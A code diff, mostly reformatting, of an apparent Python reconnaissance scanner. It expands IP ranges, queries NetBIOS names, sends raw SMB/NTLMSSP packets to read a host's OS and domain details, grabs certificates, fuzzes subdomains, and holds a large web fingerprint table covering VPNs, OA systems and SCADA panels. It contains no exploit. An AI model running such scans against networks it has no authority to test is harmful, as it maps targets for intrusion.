@@ -4954,15 +5175,16 @@ class subscanProcess:
             sys.stdout.flush()
 
         except Exception as e:
-            binging = PASSAT("BING Request error")  + " | "
+            binging = PASSAT("BING Request error") + " | "
             sys.stdout.write(binging)
             sys.stdout.flush()
 
         return result
 
+
 def to_ips(raw):
 
-    # TODO: calculate the capacity 
+    # TODO: calculate the capacity
     if containenglish(raw):
         yield raw
 
@@ -4970,14 +5192,20 @@ def to_ips(raw):
         addr, mask = raw.split("/")
         mask = int(mask)
 
-        bin_addr = "".join([ (8 - len(bin(int(i))[2:])) * "0" + bin(int(i))[2:] for i in addr.split(".")])
+        bin_addr = "".join(
+            [
+                (8 - len(bin(int(i))[2:])) * "0" + bin(int(i))[2:]
+                for i in addr.split(".")
+            ]
+        )
         start = bin_addr[:mask] + (32 - mask) * "0"
         end = bin_addr[:mask] + (32 - mask) * "1"
         # num = int(start, 2) ^ int(end, 2)
         for i in range(int(start, 2), int(end, 2) + 1):
             bin_addr = (32 - len(bin(int(i))[2:])) * "0" + bin(i)[2:]
-            yield ".".join([str(int(bin_addr[8 * i: 8 * (i + 1)], 2)) for i in range(0, 4)])
-        
+            yield ".".join(
+                [str(int(bin_addr[8 * i : 8 * (i + 1)], 2)) for i in range(0, 4)]
+            )
 
     elif "-" in raw:
 
@@ -4990,11 +5218,14 @@ def to_ips(raw):
             for i in range(start, end + 1):
                 yield prefix + "." + str(i)
 
-        elif re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}-\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$", raw):
+        elif re.match(
+            r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}-\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$",
+            raw,
+        ):
             start, end = [ip2num(x) for x in raw.split("-")]
             # num = end - start
             for num in range(start, end + 1):
-                if not num & 0xff:
+                if not num & 0xFF:
                     continue
                 yield num2ip(num)
 
@@ -5016,58 +5247,58 @@ def nbns_name(addr):
         if isinstance(rep, str):
             rep = bytes(rep)
 
-        num = ord(rep[56:57].decode()) 
-        data = rep[57:]  
+        num = ord(rep[56:57].decode())
+        data = rep[57:]
 
         group, unique = "", ""
-        
+
         msg += "--------------------------" + "\n"
         for i in range(num):
-            name = data[18 * i:18 *i + 15].decode()
-            flag_bit = bytes(data[18 * i + 15:18 *i + 16])
-            
-            if flag_bit in GROUP_NAMES and flag_bit != b"\x00":  
+            name = data[18 * i : 18 * i + 15].decode()
+            flag_bit = bytes(data[18 * i + 15 : 18 * i + 16])
+
+            if flag_bit in GROUP_NAMES and flag_bit != b"\x00":
                 msg += "%s\t%s\t%s" % (name, "G", GROUP_NAMES[flag_bit]) + "\n"
 
-            elif flag_bit in UNIQUE_NAMES and flag_bit != b"\x00":  
+            elif flag_bit in UNIQUE_NAMES and flag_bit != b"\x00":
                 msg += "%s\t%s\t%s" % (name, "U", UNIQUE_NAMES[flag_bit]) + "\n"
-        
+
             elif flag_bit in b"\x00":
-                name_flags = data[18*i + 16: 18*i + 18]
+                name_flags = data[18 * i + 16 : 18 * i + 18]
                 if ord(name_flags[0:1]) >= 128:
                     group = name.strip()
-                    
+
                     msg += "%s\t%s\t%s" % (name, "G", GROUP_NAMES[flag_bit]) + "\n"
                 else:
                     unique = name
                     msg += "%s\t%s\t%s" % (name, "U", UNIQUE_NAMES[flag_bit]) + "\n"
             else:
                 msg += "%s\t-\t-" % name + "\n"
-        
+
         msg += "--------------------------" + "\n"
-        
+
         msg = "%s\\%s" % (group, unique) + "\n" + msg
 
-        return { "group": group, "unique": unique, "msg": msg }
-    
+        return {"group": group, "unique": unique, "msg": msg}
+
     except socket.error as e:
         return False
 
 
-def netbios_encode(src):  
-    
+def netbios_encode(src):
+
     src = src.ljust(16, "\x20")
     names = []
     for c in src:
         char_ord = ord(c)
         high_4_bits = char_ord >> 4
-        low_4_bits = char_ord & 0x0f
+        low_4_bits = char_ord & 0x0F
         names.append(high_4_bits)
         names.append(low_4_bits)
-    
+
     res = b""
     for name in names:
-        
+
         res += chr(0x41 + name).encode()
 
     return res
@@ -5080,19 +5311,19 @@ def smb_detect(addr, lock, ports=139):
         if ports == "":
             port = 139
         else:
-            port=int(ports)
+            port = int(ports)
     if port == 139:
         nbns_result = nbns_name(addr)
         if not nbns_result:
             return
         elif not nbns_result["unique"]:
-            
+
             msg += "nbns_result_error"
             lock.acquire()
             print(addr + "    " + msg)
             lock.release()
             return
-        
+
         msg += nbns_result["msg"]
 
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -5108,82 +5339,92 @@ def smb_detect(addr, lock, ports=139):
 
     if port == 139:
         name = netbios_encode(nbns_result["unique"])
-        
-        payload0 = b"\x81\x00\x00D " + name  + b"\x00 EOENEBFACACACACACACACACACACACACA\x00"
-        
+
+        payload0 = (
+            b"\x81\x00\x00D " + name + b"\x00 EOENEBFACACACACACACACACACACACACA\x00"
+        )
+
         s.send(payload0)
         s.recv(1024)
-    
+
     payload1 = b"\x00\x00\x00\x85\xff\x53\x4d\x42\x72\x00\x00\x00\x00\x18\x53\xc8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xfe\x00\x00\x00\x00\x00\x62\x00\x02\x50\x43\x20\x4e\x45\x54\x57\x4f\x52\x4b\x20\x50\x52\x4f\x47\x52\x41\x4d\x20\x31\x2e\x30\x00\x02\x4c\x41\x4e\x4d\x41\x4e\x31\x2e\x30\x00\x02\x57\x69\x6e\x64\x6f\x77\x73\x20\x66\x6f\x72\x20\x57\x6f\x72\x6b\x67\x72\x6f\x75\x70\x73\x20\x33\x2e\x31\x61\x00\x02\x4c\x4d\x31\x2e\x32\x58\x30\x30\x32\x00\x02\x4c\x41\x4e\x4d\x41\x4e\x32\x2e\x31\x00\x02\x4e\x54\x20\x4c\x4d\x20\x30\x2e\x31\x32\x00"
     payload2 = b"\x00\x00\x01\x0a\xff\x53\x4d\x42\x73\x00\x00\x00\x00\x18\x07\xc8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xfe\x00\x00\x40\x00\x0c\xff\x00\x0a\x01\x04\x41\x32\x00\x00\x00\x00\x00\x00\x00\x4a\x00\x00\x00\x00\x00\xd4\x00\x00\xa0\xcf\x00\x60\x48\x06\x06\x2b\x06\x01\x05\x05\x02\xa0\x3e\x30\x3c\xa0\x0e\x30\x0c\x06\x0a\x2b\x06\x01\x04\x01\x82\x37\x02\x02\x0a\xa2\x2a\x04\x28\x4e\x54\x4c\x4d\x53\x53\x50\x00\x01\x00\x00\x00\x07\x82\x08\xa2\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x02\xce\x0e\x00\x00\x00\x0f\x00\x57\x00\x69\x00\x6e\x00\x64\x00\x6f\x00\x77\x00\x73\x00\x20\x00\x53\x00\x65\x00\x72\x00\x76\x00\x65\x00\x72\x00\x20\x00\x32\x00\x30\x00\x30\x00\x33\x00\x20\x00\x33\x00\x37\x00\x39\x00\x30\x00\x20\x00\x53\x00\x65\x00\x72\x00\x76\x00\x69\x00\x63\x00\x65\x00\x20\x00\x50\x00\x61\x00\x63\x00\x6b\x00\x20\x00\x32\x00\x00\x00\x00\x00\x57\x00\x69\x00\x6e\x00\x64\x00\x6f\x00\x77\x00\x73\x00\x20\x00\x53\x00\x65\x00\x72\x00\x76\x00\x65\x00\x72\x00\x20\x00\x32\x00\x30\x00\x30\x00\x33\x00\x20\x00\x35\x00\x2e\x00\x32\x00\x00\x00\x00\x00"
-    
+
     s.send(payload1)
     s.recv(1024)
 
     s.send(payload2)
 
-    
     ret = s.recv(1024)
-    length = ord(ret[43: 44]) + ord(ret[44: 45]) * 256
-    os_version = ret[47 + length:]
-    
-    msg += os_version.replace(b"\x00\x00", b"|").replace(b"\x00", b"").decode("UTF-8", errors="ignore") + "\n"
+    length = ord(ret[43:44]) + ord(ret[44:45]) * 256
+    os_version = ret[47 + length :]
+
+    msg += (
+        os_version.replace(b"\x00\x00", b"|")
+        .replace(b"\x00", b"")
+        .decode("UTF-8", errors="ignore")
+        + "\n"
+    )
 
     start = ret.find(b"NTLMSSP")
-    
 
-    length = ord(ret[start + 40: start + 41]) + ord(ret[start + 41: start + 42]) * 256 
-    
-    
-    
-    offset = ord(ret[start + 44: start + 45])
+    length = ord(ret[start + 40 : start + 41]) + ord(ret[start + 41 : start + 42]) * 256
 
-    
-    
-    msg += "Major Version: %d" % ord(ret[start + 48: start + 49]) + "\n"
-    
-    msg += "Minor Version: %d" % ord(ret[start + 49: start + 50]) + "\n"
-    
-    msg += "Bulid Number: %d" %  (ord(ret[start + 50: start + 51]) + 256 * ord(ret[start + 51: start + 52])) + "\n"
-    
-    
-    msg += "NTLM Current Revision: %d" % (ord(ret[start + 55: start + 56]) ) + "\n" 
+    offset = ord(ret[start + 44 : start + 45])
 
+    msg += "Major Version: %d" % ord(ret[start + 48 : start + 49]) + "\n"
+
+    msg += "Minor Version: %d" % ord(ret[start + 49 : start + 50]) + "\n"
+
+    msg += (
+        "Bulid Number: %d"
+        % (ord(ret[start + 50 : start + 51]) + 256 * ord(ret[start + 51 : start + 52]))
+        + "\n"
+    )
+
+    msg += "NTLM Current Revision: %d" % (ord(ret[start + 55 : start + 56])) + "\n"
 
     index = start + offset
 
     while index < start + offset + length:
-        item_type = ret[index:index + 2]
-        
-        item_length = ord(ret[index + 2:index +3]) + ord(ret[index + 3:index +4]) * 256  
-        
-        item_content = ret[index + 4: index + 4 + item_length].replace(b"\x00", b"")
+        item_type = ret[index : index + 2]
+
+        item_length = (
+            ord(ret[index + 2 : index + 3]) + ord(ret[index + 3 : index + 4]) * 256
+        )
+
+        item_content = ret[index + 4 : index + 4 + item_length].replace(b"\x00", b"")
         if item_type == b"\x07\x00":
-            
+
             if PYVERSION > "3.0":
-                timestamp = int.from_bytes(item_content, byteorder="little")  
-            else:  
-                timestamp = int("".join(reversed(item_content)).encode("hex"), 16) 
+                timestamp = int.from_bytes(item_content, byteorder="little")
+            else:
+                timestamp = int("".join(reversed(item_content)).encode("hex"), 16)
 
-            
-            EPOCH_AS_FILETIME = 116444736000000000;  HUNDREDS_OF_NANOSECONDS = 10000000
-            timestamp = datetime.fromtimestamp((timestamp - EPOCH_AS_FILETIME) / HUNDREDS_OF_NANOSECONDS)
+            EPOCH_AS_FILETIME = 116444736000000000
+            HUNDREDS_OF_NANOSECONDS = 10000000
+            timestamp = datetime.fromtimestamp(
+                (timestamp - EPOCH_AS_FILETIME) / HUNDREDS_OF_NANOSECONDS
+            )
 
-            
             msg += "%s: %s" % (NetBIOS_ITEM_TYPE[item_type], timestamp) + "\n"
         elif item_type in NetBIOS_ITEM_TYPE:
-            
-            msg += "%s: %s" % (NetBIOS_ITEM_TYPE[item_type], item_content.decode(errors="ignore")) + "\n"
-        elif item_type == b"\x00\x00":  
+
+            msg += (
+                "%s: %s"
+                % (NetBIOS_ITEM_TYPE[item_type], item_content.decode(errors="ignore"))
+                + "\n"
+            )
+        elif item_type == b"\x00\x00":
             break
         else:
-            
+
             msg += "Unknown: %s" % (item_content) + "\n"
-        
-        index +=  4 + item_length
+
+        index += 4 + item_length
 
     lock.acquire()
-    print(addr + "    " +  msg)
+    print(addr + "    " + msg)
     resAlivedomainFile.write(addr + "   " + msg + "\n")
     resAlivedomainFile.flush()
     lock.release()
@@ -5202,8 +5443,10 @@ def unzip(data):
     gz.close()
     return data
 
+
 def containenglish(str0):
     return bool(re.search("[a-z]", str0))
+
 
 def openFile(filename):
     hostlist = []
@@ -5217,17 +5460,18 @@ def openFile(filename):
             line = line.decode("utf-8")
         except:
             pass
-        
+
         line = line.strip("\n")
         if "/" in line and "//" not in line and not containenglish(line):
             tempiplist = to_ips(line)
             hostlist += list(tempiplist)
         elif "//" in line:
-            hostlist.append(line.strip().replace("http://","").replace("https://",""))
+            hostlist.append(line.strip().replace("http://", "").replace("https://", ""))
         else:
             hostlist.append(line.strip())
 
     return hostlist
+
 
 def opensubDomainFile(filename):
     hostlist = []
@@ -5238,14 +5482,19 @@ def opensubDomainFile(filename):
         sys.exit(0)
     if "[fuzz]" in args.host:
         for line in f:
-            hostlist.append(args.host.replace("http://","").replace("https://","").replace("[fuzz]",line.decode().strip()))
+            hostlist.append(
+                args.host.replace("http://", "")
+                .replace("https://", "")
+                .replace("[fuzz]", line.decode().strip())
+            )
 
     else:
         for line in f:
-            hostlist.append(line.decode().strip()+args.host)
+            hostlist.append(line.decode().strip() + args.host)
 
     f.close()
     return hostlist
+
 
 def opensubFile(filename):
     # hostscan read file
@@ -5260,9 +5509,10 @@ def opensubFile(filename):
         hostlist.append(line.decode().strip() + "." + args.domain)
     return hostlist
 
+
 def openUrlFile(filename):
     urllist = []
-    try:    
+    try:
         f = open(filename, "r")
     except:
         print(info("File not find"))
@@ -5272,22 +5522,33 @@ def openUrlFile(filename):
         urllist.append(urlpath.strip("\n").strip("\r"))
     return urllist
 
+
 def ip2num(ip):
-    
+
     ips = [int(x) for x in ip.split(".")]
     return ips[0] << 24 | ips[1] << 16 | ips[2] << 8 | ips[3]
 
+
 def num2ip(num):
-    return "%s.%s.%s.%s" % ((num >> 24) & 0xff, (num >> 16) & 0xff, (num >> 8) & 0xff, (num & 0xff))
+    return "%s.%s.%s.%s" % (
+        (num >> 24) & 0xFF,
+        (num >> 16) & 0xFF,
+        (num >> 8) & 0xFF,
+        (num & 0xFF),
+    )
+
 
 def gen_ip(ip):
     if type(ip) is not list:
         for ips in to_ips(ip.strip()):
             yield ips
+
         return
+
     for i in ip:
         for ips in to_ips(i.strip()):
             yield ips
+
 
 def getHttpCert(host, port):
     if args.nocert:
@@ -5295,7 +5556,7 @@ def getHttpCert(host, port):
 
     try:
         ip = socket.gethostbyname(host)
-        sock= socket.socket()
+        sock = socket.socket()
         sock.settimeout(4)
         c = ssl.wrap_socket(sock, cert_reqs=ssl.CERT_REQUIRED, ca_certs="cacert.pem")
         c.settimeout(4)
@@ -5311,21 +5572,23 @@ def getHttpCert(host, port):
 class FingerStruct:
     def __init__(self):
         self.fail = 0
-        self.child = [0 for i in range(91)] # Character word ord("z") - ord("/x20") + 1
+        self.child = [0 for i in range(91)]  # Character word ord("z") - ord("/x20") + 1
         self.exist = []
+
 
 class CFingerStruct:
     def __init__(self):
         self.fail = 0
-        self.child = [0 for i in range(1000)] 
+        self.child = [0 for i in range(1000)]
         self.exist = []
+
 
 class Fingerident:
     def __init__(self):
         self.fin = {"SHORTCUT ICON\" href=\"img/logo_small.ico\"":"用友nc!!","spring.cloud.bootstrap.location":"spring location yaml","spring.datasource.hikari.connection-test-query":"spring hikari","spring.cloud.bootstrap.location":"srping location","logo/images/logo.gif":"用友nc_gif", "ch.qos.logback.classic": "spring jolokia logback", "defaultZone": "srping env defaultZone", "servletContextInitParams": "Spring env!!", "logback": "Spring env!!", "Error 401--Unauthorized": "Weblogic!!", "Error 404--Not Found": "Weblogic!!", "Error 403--": "Weblogic!!", "Error 500--": "Weblogic!!", "/por/login_psw.csp": "Sangfor SSL VPN!!","weaver,e-mobile":"e-mobile!!", "ecology":"ecology!!", "\"/r/cms/":"JEECMS!!", "e-Bridge":"e-Bridge!!", "wx.weaver":"e-Bridge!!", "Swagger":"Swagger UI!!", "4008 111 000":"Ruijie", "Script/SmcScript.js?version=":"Huawei SMC", "/wnm/ssl/web/frame/login.html": "H3C Router", "/+CSCOE+/logon.html": "Cisco SSLVPN!!", "Huawei":"Huawei", "huawei":"Huawei", "Hicloud":"Huawei", "hicloud":"Huawei", "Vmall":"Huawei", "vmall":"Huawei", "../zentao/theme/zui/css/min.css":"Zentao!!", "/webmail/client/index.php?module=operate&action=login":"U-Mail!!", "UI_component/commonDefine/UI_regex_define.js":"Huawei Firewall","/zcms/":"ZCMS!!", "gHasSecureMail":"亿邮!!", "any_rsa_pass": "anymacro!!", "https://sec.anymacro.com":"anymacro!!", "action=\"/coremail/index.jsp?cus=1\"":"Coremail!!", "/coremail/common/":"Coremail!!", "href=\"/seeyon/skin/dist":"致远OA!!", "/seeyon/main.do":"致远OA!!", "StylePath:\"/resource/style":"蓝凌ekp!!", "Office Anywhere":"通达OA!!", "general/login_code.php":"通达OA!!", "webmail/se/account/download.do":"Richmail!!", "url=/webmail/\"":"Richmail!!", "Zabbix SIA":"Zabbix!!", "Powered by Discuz!":"Discuz!!", "content=\"Discuz!":"Discuz!!", "/bds/stylesheets/fds.css":"Biscom-Delivery-Server", "/bds/includes/fdsJavascript.do":"Biscom-Delivery-Server", "/ewebeditor.htm?":"ewebeditor", "align=center>HP Officejet": "HP-OfficeJet-Printer", "/bds/stylesheets/fds.css": "Biscom-Delivery-Server", "/bds/includes/fdsJavascript.do": "Biscom-Delivery-Server", "style/pwc/ddwrt.css": "DD-WRT", "/ewebeditor.htm?": "ewebeditor", "new FCKeditor": "fckeditor", "xheditor_lang/zh-cn.js": "xheditor", "class=xheditor": "xheditor","free_nbr_login_form.png": "锐捷NBR路由器", "passWithWarnings": "arrisi_Touchstone", "Forms/rpAuth_1": "ZyXEL", "mon.  Tell me your username": "Ruckus", "/jscripts/rap_util.js": "rap", "__admin_media_prefix__": "Django", "csrfmiddlewaretoken": "Django", "axis2-web/css/axis-style.css": "axis2-web", "xmlns:wicket=": "Apache-Wicket", "/org.apache.wicket.": "Apache-Wicket", "<h1>BEA WebLogic Server": "BEA-WebLogic-Server", "WebLogic": "BEA-WebLogic-Server", "<!-- /killlistable.tpl -->": "EDK", "target=_blank>eDirectory&trade": "eDirectory", "Powered by <a href=http://www.edirectory.com": "eDirectory", "Powered by Esvon": "Esvon-Classifieds", "content=fluid dynamics": "Fluid-Dynamics-Search-Engine", "<a href=/_replSet>Replica set status</a></p>": "mongodb", "The Magic Voice Box": "MVB2000", "lemis.WEB_APP_NAME": "lemis管理系统", "logo_freeboxos": "FreeboxOS", "mfs.cgi": "moosefs", "under-goal files": "moosefs", "BACKGROUND: url(images/loginbg.jpg) #e5f1fc": "蓝盾BDWebGuard", "Generated by phpDocumentor": "phpDocumentor", "_jcr_content": "Adobe_ CQ5", "generator content=Adobe GoLive": "Adobe_GoLive", "generator content=Adobe RoboHelp": "Adobe_RoboHelp", "generator content=Amaya": "Amaya", "loginHead><link href=App_Themes": "OpenMas", "recaptcha_ajax.js": "recaptcha", "style/base/jw.css": "正方教务管理系统", "logo/images/": "UFIDA_NC", "logo/images/ufida_nc.png": "UFIDA_NC", "opac_two": "北创图书检索系统", "/common/resources/images/common/app/gridview.ico": "sugon_gridview", "plugin.php?id=milu_seotool": "milu_seotool", "js/iLO.js": "HP_iLO(HP_Integrated_Lights-Out)", "/S7Web.css": "Siemens_SIMATIC", "LX JENEsys": "lynxspring_JENEsys", "cmn/css/common-min.css": "Comcast_Business", "(Everything.gif": "Everything", "/reset-meyer-1.0.min.css": "xfinity", "/js/roomHeight.js": "网动云视讯平台", "meetingShow!show.action": "网动云视讯平台", "/scripts/jquery.landray.common.js": "蓝凌EIS智慧协同平台", "v11_QRcodeBar clr": "蓝凌EIS智慧协同平台", "/src/system/login.php": "金山KingGate", "content=PHPEMS": "phpems考试系统",  "Zhirui.js": "智睿软件", "Default/apabi.css": "Apabi数字资源平台", "<link href=HTTP://apabi": "Apabi数字资源平台", "http://stat.xiaonaodai.com/stat.php": "小脑袋", "onclick=dlg_download()": "天融信网络审计系统!!", "/js/report/horizontalReportPanel.js": "天融信脆弱性扫描与管理系统", "yabsoft.com": "Advanced-Image-Hosting-Script", "Welcome to install AIHS Script": "Advanced-Image-Hosting-Script", "content=AChecker is a Web accessibility": "AChecker Web accessibility evaluation tool", "/images/rockcolor.gif": "SCADA PLC", "/ralogo.gif": "SCADA PLC", "Ethernet Processor": "SCADA PLC", "content=Visual Basic .NET 7.1": ".NET", "DESIGN BY SOMOIDEA": "SOMOIDEA", "/archiva.js": "Apache-Archiva", "/archiva.css": "Apache-Archiva", "Powered by am4ss": "AM4SS", "am4ss.css": "AM4SS", "ASPThai.Net Webboard": "ASPThai_Net-Webboard", "/acc_aggregated_reporting.js": "Astaro-Command-Center", "/js/_variables_from_backend.js?": "Astaro-Command-Center", "CONTENT=ASP-Nuke": "ASP-Nuke", "content=ASPNUKE": "ASP-Nuke", "Surf the web invisibly using ASProxy power": "ASProxy", "btnASProxyDisplayButton": "ASProxy", "Powered by: Arab": "Arab-Portal", "appserv/softicon.gif": "AppServ", "index.php?appservlang=th": "AppServ", "This script was generated by ApPHP Calendar": "ApPHP-Calendar", "BigDump: Staggered MySQL Dump Importer": "BigDump", "content=www.bst.pl": "BestShopPro", "<!-- Basic Analysis and Security Engine (BASE) -->": "BASE", "mailto:base@secureideas.net": "BASE", "/Software/Basilic": "Basilic", "Powered by: <a href=http://www.mevin.com/>": "Basic-PHP-Events-Lister", "Powered by <a href=http://www.avscripts.net/avarcade/": "AV-Arcade", "index.php?cmd=11": "Auxilium-PetRatePro", "psb_printjobs.gif": "Axis-PrintServer", "/cgi-bin/prodhelp?prod=": "Axis-PrintServer", "VALUE=Copyright (C) 2000, Cobalt Networks": "BlueQuartz", "Thank you for using the BlueOnyx": "BlueOnyx", "<!-- START HEADER TABLE - HOLDS GRAPHIC AND SITE NAME -->": "BM-Classifieds", "window.location=/Citrix/MetaFrame": "Citrix-Metaframe", "/images/Cogent.gif": "Cogent-DataHub", "<!--!!!!!!!!!!!!!!!!!!!!!!!!! Processing SCRIPT": "ClipShare", "Powered By <a href=http://www.clip-share.com": "ClipShare", "<a href=http://www.jmarshall.com/tools/cgiproxy/": "CGIProxy", "Powered By <a href=http://codefuture.co.uk/projects/imagehost/": "CF-Image-Hosting-Script", "Powered by: <a href=http://www.censura.info": "Censura", "<!-- SiteMinder Encoding": "CA-SiteMinder", "/images/CCNWeb.gif": "Carrier-CCNWeb", "<APPLET CODE=JLogin.class ARCHIVE=JLogin.jar": "Carrier-CCNWeb", "Powered by <a href=http://www.forperfect.com/": "cInvoice", "alt=Remote Support by BOMGAR": "Bomgar", "<a href=http://www.bomgar.com/products class=inverse": "Bomgar", "/capexweb.parentvalidatepassword": "cApexWEB", "name=dfparentdb": "cApexWEB", "content=Camera Life": "CameraLife", "This site is powered by Camera Life": "CameraLife", "Powered by <A HREF=http://www.CalendarScript.com": "CalendarScript", "href=http://cachelogic.net>Cachelogic.net": "Cachelogic-Expired-Domains-Script", "Powered by <b><a href=http://www.woltlab.de": "Burning-Board-Lite", "Powered by <b>Burning Board": "Burning-Board-Lite", "Powered By <a href=http://www.vastal.com": "Buddy-Zone", ">Buddy Zone</a>": "Buddy-Zone", "/ModalPopup/core-modalpopup.css": "Bulletlink-Newspaper-Template", "powered by bulletlink": "Bulletlink-Newspaper-Template", "<FRAME SRC=/printer/inc_head.html": "Brother-Printer", "<IMG src=/common/image/HL4040CN": "Brother-Printer", "Powered by Daffodil": "Daffodil-CRM", "Design & Development by Daffodil Software Ltd": "Daffodil-CRM", "content=cyn.in": "Cyn_in", "Powered by cyn.in": "Cyn_in", "OperaLogin/Welcome.do": "Oracle_OPERA", "Powered by DUportal": "DUgallery", "DUgallery": "DUgallery", "name=DC.title": "DublinCore", "<!--[ DZCP": "DZCP", "dvwa/css/login.css": "DVWA", "dvwa/images/login_logo.png": "DVWA", "CONTENT=DORG": "DORG", "<meta name=keywords content=VOS3000": "VOS3000", "<meta name=description content=VOS3000": "VOS3000", "images/vos3000.ico": "VOS3000", "Powered by Elite": "Elite-Gaming-Ladders", "content=Gallarific": "Gallarific", "Powered by EZCMS": "EZCMS", "EZCMS Content Management System": "EZCMS", "Powered by <a href=http://www.datemill.com": "Etano", "Etano</a>. All Rights Reserved.": "Etano", "/org.geoserver.web.GeoServerBasePage/": "GeoServer", "class=geoserver lebeg": "GeoServer", "Powered by <a href=http://geonode.org": "GeoNode", "target=_blank>freehelpdesk.org": "Help-Desk-Software", "<a href=http://www.gridsite.org/>GridSite": "GridSite", "gridsite-admin.cgi?cmd": "GridSite", "/cgi-bin/scada-vis/": "GenOHM-SCADA", "/MasterView.css": "Infomaster", "/masterView.js": "Infomaster", "/MasterView/MPLeftNavStyle/PanelBar.MPIFMA.css": "Infomaster", "content=Imageview": "Imageview", "By Jorge Schrauwen": "Imageview", "content=Ikonboard": "Ikonboard", "Powered by <a href=http://www.ikonboard.com": "Ikonboard", "href=igallery.asp": "i-Gallery", "SolrCore Initialization Failures": "Solr", "app_config.solr_path": "Solr", "Powered by Inoutscripts": "Inout-Adserver", "alt=ionCube logo": "ionCube-Loader", "content=Talldude Networks": "Jamroom", "content=Jamroom": "Jamroom", "/dana-na/auth/welcome.cgi": "Juniper-NetScreen-Secure-Access", "content=Jcow": "Jcow", "content=Powered by Jcow": "Jcow", "end jcow_application_box": "Jcow", "Powered by <a href=http://www.invisionboard.com": "InvisionPowerBoard", "TS_expiredurl": "teamportal", "testlink_library.js": "testlink", "browser_search_plugin.php?type=id": "mantis", "MantisBT Team": "mantis", "powered by activeCollab": "activeCollab", "<p id=powered_by><a href=http://www.activecollab.com/": "activeCollab", "<!-- This is part of CGI:IRC": "CGI:IRC", "<small id=ietest><a href=http://cgiirc.org/": "CGI:IRC", "content=dota OpenStats": "DotA-OpenStats", "content=openstats.iz.rs": "DotA-OpenStats", "content=eLitius": "eLitius", "<a href=http://www.gregphoto.net/gcards/index.php": "gCards", "Powered by <a href=http://www.iscripts.com/reservelogic/": "iScripts-ReserveLogic", "http://www.jobberbase.com": "jobberBase", "Jobber.PerformSearch": "jobberBase", "content=Jobberbase": "jobberBase",  "/vhost/view/default/style/login.css": "easypanel", "generator content=AWStats": "awstats_admin", "<frame name=mainleft src=awstats.pl?config=": "awstats_admin", "awstats.pl?config=": "awstats", "Webmin server on": "Webmin", "SYNO.SDS.Session": "Synology_DiskStation", "Citrix Systems, Inc. XenServer": "Citrix-XenServer", "<a href=XenCenterSetup.exe>XenCenter installer</a>": "Citrix-XenServer", "content=DSpace": "DSpace", "<a href=http://www.dspace.org>DSpace Software": "DSpace", "/dwr/engine.js": "dwr", "<IMG SRC=/images/header.jpg ALT=File Upload Manager>": "File-Upload-Manager", "content=the fantabulous mechanical eviltwin code machine": "FileNice", "fileNice/fileNice.js": "FileNice", "content=Glossword": "Glossword", "/shared/ibmbch.png": "IBM-BladeCenter", "/shared/ibmbcs.png": "IBM-BladeCenter", "alt=IBM BladeCenter": "IBM-BladeCenter", "href=http://www.hp.com/go/ilo": "iLO", "Powered by: Support Center": "Isolsoft-Support-Center", "powered by <a HREF=http://www.ispconfig.org": "ISPConfig", "Powered by Kleeja": "Kleeja", "src=/img/hypervm-logo.gif": "Kloxo-Single-Server", "/htmllib/js/preop.js": "Kloxo-Single-Server", "/authjsp/login.jsp": "易瑞授权访问系统", "FE0174BB-F093-42AF-AB20-7EC621D10488": "易瑞授权访问系统", "Dolibarr Development Team": "Dolibarr", "Parallels IP Holdings GmbH": "Parallels Plesk Panel", "CDGServer3": "亿赛通DLP", "75718C9A-F029-11d1-A1AC-00C04FB6C223": "huawei_auth_server", "360EntInst": "360企业版", "/nc/servlet/nc.ui.iufo.login.Index": "用友erp-nc!!", "an_util.js": "Array_Networks_VPN", "welcome.cgi?p=logo": "juniper_vpn", "/zport/dmd/": "zenoss", "/preauth/login.cgi": "Ultra_Electronics", "/preauth/style.css": "Ultra_Electronics", "valoriserDiv5": "ALCASAR", "/bundles/oroui/": "orocrm", "Adiscon LogAnalyzer": "Adiscon_LogAnalyzer", "Auto-generated by Munin": "Munin", "munin-month.html": "Munin", "Command line is easier to read using View Page Properties of your browser": "MRTG", "commandline was: indexmaker": "MRTG", "yuannian.css": "元年财务软件", "/image/logo/yuannian.gif": "元年财务软件", "window.open(/login.do,airWin": "锐捷应用控制引擎", "stormtimestr": "Storm", "Generator content=Centreon - Copyright": "Centreon", "FortiGuard Web Filtering": "FortiGuard", "/XX/YY/ZZ/CI/MGPGHGPGPFGHCDPFGGOGFGEH": "FortiGuard", "/admin/css/images/pineapp.ico": "PineApp", "/static/cdr-stats/js/jquery": "CDR-Stats", "Genie Networks Ltd.": "GenieATM", "defect 3531": "GenieATM", "kbnVersion": "Kibana", "ESENSOFT_IREPORT_SERVER": "i@Report", "com.sanlink.server.Login": "i@Report", "ireportclient": "i@Report", "css/ireport.css": "i@Report", "module/image/pldsec.css": "帕拉迪统一安全管理和综合审计系统", "location.href=homeLogin.action": "金龙卡金融化一卡通网站查询子系统", "/custom/GroupNewsList.aspx?GroupId=": "一采通", "getFirstU8Accid": "用友U8", "sweb-lib/resource/": "华为（HUAWEI）安全设备", "css/lsec/login.css": "网神防火墙", "/ccmadmin/": "cisco UCM", "/netrep/intf": "久其通用财表系统", "/netrep/message2/": "久其通用财表系统", "EGSS_User": "soeasy网站集群系统",  "i18ninit.min.js": "科来RAS", "type=application/npRas": "科迈RAS系统",  "URL=general/ERP/LOGIN/": "单点CRM系统",  "<img src=images/logoknow.png": "中国期刊先知网", "/Loyaa/common.lib.js": "loyaa信息自动采编系统", "OnlineQuery/QueryList.aspx": "浪潮政务系统", "LangChao.ECGAP.OutPortal": "浪潮政务系统", "/Public/js/5kcrm.js": "悟空CRM", "/System/Login/Login.asp?AppID=": "用友ufida", "easSessionId": "金蝶EAS!!", "/kdgs/script/kdgs.js": "金蝶政务GSiS", "/logoZKAccess_zh-cn.jpg": "ZKAccess 门禁管理系统", "/css/impl-security.css": "锐捷 RG-DBS", "/dbaudit/authenticate": "锐捷 RG-DBS", "SANGFOR FW": "深信服防火墙类产品!!", "content=Apache Forrest": "Apache-Forrest", "name=Forrest": "Apache-Forrest", "/bw_templete1.dwt": "Advantech-WebAccess", "/broadweb/WebAccessClientSetup.exe": "Advantech-WebAccess", 